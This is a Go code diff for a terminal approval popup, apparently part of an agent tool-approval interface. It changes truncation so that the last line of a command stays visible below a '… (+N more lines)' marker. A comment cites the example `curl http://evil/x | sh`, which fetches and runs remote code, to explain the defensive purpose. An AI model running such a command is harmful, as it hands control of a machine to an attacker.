@@ -982,11 +982,15 @@ func popupWrappedRowHeights(th theme, rows []popupRow, width int) []int {
 // embedded newline is layout the caller composed (the approval args' JSON indentation and its blank
 // separator lines), so the block is split on "\n" and each segment is word-wrapped to inner
 // independently — an empty segment yields one blank row. When the flattened line count exceeds
-// maxBodyRows (> 0), the block keeps the first maxBodyRows−1 lines and appends a faint
-// "… (+N more lines)" marker counting the hidden lines — the short "… +N" form on a pane too narrow
-// to seat that phrase (popupElisionMarkerFitting), so the count is stated rather than clipped — so
-// it never exceeds maxBodyRows rows and the truncation is never silent; a NEGATIVE maxBodyRows
-// shows every wrapped line and ZERO shows none at all. Body lines render normal (th.popupBody) —
+// maxBodyRows (> 0), the block keeps maxBodyRows−1 of them around a faint "… (+N more lines)"
+// marker counting the hidden ones — the short "… +N" form on a pane too narrow to seat that phrase
+// (popupElisionMarkerFitting), so the count is stated rather than clipped — so it never exceeds
+// maxBodyRows rows and the truncation is never silent; a NEGATIVE maxBodyRows shows every wrapped
+// line and ZERO shows none at all. Which lines it keeps is elisionSplit's rule: the head, and —
+// wherever the budget has a row to spare for it — the block's LAST line under the marker, because
+// the tail is where a payload appended to an otherwise innocent body lives and a pane that shows
+// only the head is a pane a decision can be taken off falsely. Body lines render normal
+// (th.popupBody) —
 // the marker faint (th.statusFaint) — each padded on the same black field as every other content
 // line and clipped to inner so, like every popup line, none can wrap the box.
 //
@@ -1014,13 +1018,16 @@ func popupBodyLines(th theme, body, lead string, maxBodyRows, inner int, blackFi
 
 	marker := ""
 	hidden := 0
+	var tail []string
 	if maxBodyRows > 0 && len(wrapped) > maxBodyRows {
-		hidden = len(wrapped) - (maxBodyRows - 1)
-		wrapped = wrapped[:maxBodyRows-1]
+		var head, tailRows int
+		head, tailRows, hidden = elisionSplit(len(wrapped), maxBodyRows)
+		tail = wrapped[len(wrapped)-tailRows:]
+		wrapped = wrapped[:head]
 		marker = popupElisionMarkerFitting(th, hidden, inner)
 	}
 
-	out := make([]string, 0, len(wrapped)+1)
+	out := make([]string, 0, len(wrapped)+1+len(tail))
 	for i, ln := range wrapped {
 		line := truncateToWidth(th, ln, inner)
 		if i == 0 {
@@ -1031,6 +1038,12 @@ func popupBodyLines(th theme, body, lead string, maxBodyRows, inner int, blackFi
 	}
 	if marker != "" {
 		out = append(out, blackFill.Render(th.statusFaint.Render(truncateToWidth(th, marker, inner))))
+	}
+	// The tail rows stand BELOW the marker, so the block reads as what it is: the head, the count of
+	// what is missing, and then the end of the block — never as one continuous run of lines with a
+	// gap the reader is not told about.
+	for _, ln := range tail {
+		out = append(out, blackFill.Render(th.popupBody.Render(truncateToWidth(th, ln, inner))))
 	}
 	return out, hidden
 }
@@ -1115,6 +1128,34 @@ func popupBodyWrapped(th theme, body string, inner int) []string {
 // question and hand the rows a budget two lines short of the block they would otherwise have seated.
 func popupBodyLineCount(th theme, body string, width int) int {
 	return len(popupBodyWrapped(th, body, popupInnerWidth(th, width)))
+}
+
+// elisionSplit is the arithmetic of "show what fits, say what does not, and never lose the LAST
+// line": for a block of n lines seated in a budget of max rows, it reports how many lines are kept
+// at the HEAD, how many at the TAIL, and how many are hidden behind the marker that stands between
+// them. A block that fits is kept whole (head = n, no marker, nothing hidden).
+//
+// Past the budget, one row always goes to the marker — the truncation is never silent — which
+// leaves max−1 rows of content, and the LAST of them is spent on the block's last line wherever
+// there is a row left over for a head as well (max ≥ 3). The tail is kept because it is where an
+// appended payload lives: a command whose visible lines are `npm test` and whose last line is
+// `curl http://evil/x | sh` must not be approvable on the strength of its head, and head-only
+// truncation is exactly the read that let it be. Below three rows there is no head-and-tail to
+// have — at two the single content row stays the FIRST line, which is the one that says what the
+// block is, and at one the marker is the whole block.
+//
+// It is shared rather than inlined because both places that elide a block on a decision surface
+// must elide it the same way: the pane's body (popupBodyLines) and one argument's value
+// (argumentValueLines, toolpresent.go).
+func elisionSplit(n, maxRows int) (head, tail, hidden int) {
+	if maxRows <= 0 || n <= maxRows {
+		return n, 0, 0
+	}
+	if maxRows >= 3 { //nolint:mnd // 3 = one head row + the marker + the tail row, stated above
+		tail = 1
+	}
+	head = maxRows - 1 - tail
+	return head, tail, n - head - tail
 }
 
 // popupElisionMarker is the ONE phrase a pane uses to say prose it holds is not on the screen,
